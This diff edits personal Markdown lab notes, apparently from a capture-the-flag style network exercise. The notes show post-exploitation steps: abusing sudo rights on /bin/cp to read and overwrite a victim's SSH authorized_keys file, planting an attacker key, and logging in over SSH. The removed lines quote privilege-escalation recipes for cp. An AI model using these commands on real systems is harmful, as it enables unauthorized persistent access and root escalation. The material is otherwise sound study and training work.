@@ -3,10 +3,8 @@
 After getting a Reverse Shell you need to get SSH Keys to connect via SSH.
 
 As you can use /bin/cp command as root from run the following command:
-```
-www-data@ip-10-200-113-12:/var/www/html$ **sudo /bin/cp /home/ubuntu/.ssh/authorized_keys /dev/stdout**
 
-```
+www-data@ip-10-200-113-12:/var/www/html$ `sudo /bin/cp /home/ubuntu/.ssh/authorized_keys /dev/stdout`
 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN
 
@@ -15,9 +13,9 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeZbsrpsTaTF6VqP3nAl9icN4AGzsrhyxHHJq3nikh
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+IKDiXx+vyfU2QWArKGbJeT1Q/WvF7jX1slAmt/iZu89fUABt2O0wtqxs5e38zO4RvM8xqYwk3Pn0Sikqcaqlk2ra2A7xFdG92RNs4QYXJUyK6dW+G5RZGBQe+f0nIFx9Dz19WqlfbGWpenke5PYGLpNvZRilA9EvIvIJG6+lKf9CRgI0T5vkarqpuVSIqyS3wggOmj/vtzGM0bjERJJdsHaRtje4FJaRK3obIsOpfvSchq9QAmP72EYA4X4+eifThmlIF/o3b8uFwOTlhznjKtcEL5Dfrqc8X2Yv2p9R5kjI6/fpZbuXWVRWUHAu+Snu0RPqacJXGuAxUpb0COKf ubuntu@ip-172-31-10-250
 
 ## Create a new key on Kali
-```
-ssh-keygen -t rsa
-```
+
+$ `ssh-keygen -t rsa`
+
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/kali/.ssh/id_rsa): rsa
 Enter passphrase (empty for no passphrase): 
@@ -39,58 +37,32 @@ The key's randomart image is:
 |                 |
 +----[SHA256]-----+
 
-```
-cat rsa.pub
-```
+
+$ `cat rsa.pub`
+
 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC20C4/W73M8kWWcghrF7puisfbN2/f8bwQ/FfKyKnCD6CphOfzNLPF+UX2xVBxTRD5zPBHFQ7reLojGLbSSxkBbWve7Jg3hcUiVefB08SRs11aHD8GR894j6WPzI0nuXsoVoeEfGYF70zbrsemmNHA6eFaAwJNsramm/BwIfcitLgKtey9ptd9Tu+eYAetN4Ii8VGWAvQ2EkbdZ9HQrZkCOPIA2pV8aIXRtGZWKPz7Nn3vi3bEjs0RgLUqRPtJ4ByVXXI/mc8SMQnRbc3ZPioHlLK7OmAc/OzNMyTN6Xf0/Wl2Gz7RrlrmszM5BYRo3rHutgLZUkYivoZ3Td1ug1Pmw2JyPL1TMFC6DVNTPK7+x45Yq0iW0n2/UXpKRmeWo83drhahhTfazid3PuLciwS+YZnxoE0g2cp4XxE+dzjcwias7oXoNSIPZ4Tim6q35fg4b5ItA5ZS/VlBjK0oCa3S9JQ7XqRFayz2rBIF1+1y+qR/ji+Mvi6v6Ln5vqUr+Q8= kali@kali
 
 
 
 ## cp command
-https://gtfobins.github.io/gtfobins/cp/
+From https://gtfobins.github.io/gtfobins/cp/
 
-### Sudo[](https://gtfobins.github.io/gtfobins/cp/#sudo)
-
-^115a37
-
-If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
-
-- ```
-    LFILE=file_to_write
-    echo "DATA" | sudo cp /dev/stdin "$LFILE"
-    ```
-    
-- This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
-    
-    ```
-    LFILE=file_to_write
-    TF=$(mktemp)
-    echo "DATA" > $TF
-    sudo cp $TF $LFILE
-    ```
-    
-- This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.
-    
-    ```
-    sudo cp /bin/sh /bin/cp
-    sudo cp
-    ```
+![[SSH (10.200.X.12)-20240529152448150.webp]]
 
 
 ## Drop this key into the VPN's authorized_keys file
 Following the instruccions from  File Write section run the commands on the reverse shell to drop the key into the VPN's authorized_keys file.
 
-```
-LFILE=/home/ubuntu/.ssh/authorized_keys
 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC20C4/W73M8kWWcghrF7puisfbN2/f8bwQ/FfKyKnCD6CphOfzNLPF+UX2xVBxTRD5zPBHFQ7reLojGLbSSxkBbWve7Jg3hcUiVefB08SRs11aHD8GR894j6WPzI0nuXsoVoeEfGYF70zbrsemmNHA6eFaAwJNsramm/BwIfcitLgKtey9ptd9Tu+eYAetN4Ii8VGWAvQ2EkbdZ9HQrZkCOPIA2pV8aIXRtGZWKPz7Nn3vi3bEjs0RgLUqRPtJ4ByVXXI/mc8SMQnRbc3ZPioHlLK7OmAc/OzNMyTN6Xf0/Wl2Gz7RrlrmszM5BYRo3rHutgLZUkYivoZ3Td1ug1Pmw2JyPL1TMFC6DVNTPK7+x45Yq0iW0n2/UXpKRmeWo83drhahhTfazid3PuLciwS+YZnxoE0g2cp4XxE+dzjcwias7oXoNSIPZ4Tim6q35fg4b5ItA5ZS/VlBjK0oCa3S9JQ7XqRFayz2rBIF1+1y+qR/ji+Mvi6v6Ln5vqUr+Q8= kali@kali" | sudo cp /dev/stdin "$LFILE"
-```
+`LFILE=/home/ubuntu/.ssh/authorized_keys`
+
+`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC20C4/W73M8kWWcghrF7puisfbN2/f8bwQ/FfKyKnCD6CphOfzNLPF+UX2xVBxTRD5zPBHFQ7reLojGLbSSxkBbWve7Jg3hcUiVefB08SRs11aHD8GR894j6WPzI0nuXsoVoeEfGYF70zbrsemmNHA6eFaAwJNsramm/BwIfcitLgKtey9ptd9Tu+eYAetN4Ii8VGWAvQ2EkbdZ9HQrZkCOPIA2pV8aIXRtGZWKPz7Nn3vi3bEjs0RgLUqRPtJ4ByVXXI/mc8SMQnRbc3ZPioHlLK7OmAc/OzNMyTN6Xf0/Wl2Gz7RrlrmszM5BYRo3rHutgLZUkYivoZ3Td1ug1Pmw2JyPL1TMFC6DVNTPK7+x45Yq0iW0n2/UXpKRmeWo83drhahhTfazid3PuLciwS+YZnxoE0g2cp4XxE+dzjcwias7oXoNSIPZ4Tim6q35fg4b5ItA5ZS/VlBjK0oCa3S9JQ7XqRFayz2rBIF1+1y+qR/ji+Mvi6v6Ln5vqUr+Q8= kali@kali" | sudo cp /dev/stdin "$LFILE"`
+
 ## Connect to the server from Kali
-```
-ssh ubuntu@10.200.10.12 -i rsa
 
-```
+$  `ssh ubuntu@10.200.10.12 -i rsa`
+
 
 The authenticity of host '10.200.10.12 (10.200.10.12)' can't be established.
 ED25519 key fingerprint is SHA256:VNkFkNLPumSiOW8qgun9K81FptOl/QPenkQylHqjNPU.
@@ -120,8 +92,7 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-1101-aws x86_64)
 
 
 Last login: Thu May  4 17:53:22 2023 from 102.132.177.54
-ubuntu@ip-10-200-10-12:~$
-
+<font color="#00b050">ubuntu@ip-10-200-10-12:~$</font>
 
 
 ## Routing network traffic with proxychains
